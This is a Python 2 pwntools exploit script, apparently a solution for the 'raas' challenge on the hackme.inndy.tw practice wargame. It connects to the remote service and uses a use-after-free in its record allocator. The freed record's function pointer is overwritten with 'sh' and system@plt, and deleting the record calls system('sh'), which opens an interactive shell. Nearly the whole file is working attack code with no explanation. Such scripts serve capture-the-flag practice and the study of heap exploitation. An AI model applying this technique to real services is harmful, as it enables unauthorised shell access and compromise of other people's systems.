#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "i386",os = "linux", log_level = "debug")

def record_new(p, index, rec_type, str_length, value):
    p.recvuntil("Act > ")
    p.sendline("1")
    p.recvuntil("Index > ")
    p.sendline(index)
    p.recvuntil("Type > ")
    p.sendline(rec_type)
    if rec_type == "2":
        p.recvuntil("Length > ")
        p.sendline(str_length)
    p.recvuntil("Value > ")
    p.sendline(value)

def record_del(p, index):
    p.recvuntil("Act > ")
    p.sendline("2")
    p.recvuntil("Index > ")
    p.sendline(index)

p = remote("hackme.inndy.tw", 7719)
# p = process('./raas.patched')
elf = ELF('./raas.patched')
gdb_command =   """
                b *0x80487a3
                b *0x8048880
                b *0x804893a
                """
# two malloc in do_new, call eax in do_del
time.sleep(1)
# gdb.attach(p, gdb_command)

system_plt = elf.plt['system']

record_new(p, "0", "1", None, "0")
record_new(p, "1", "1", None, "0")
record_del(p, "1")
record_del(p, "0")
record_new(p, "2", "2", "12" , "sh\x00\x00" + p32(system_plt))
record_del(p, "1")

p.interactive()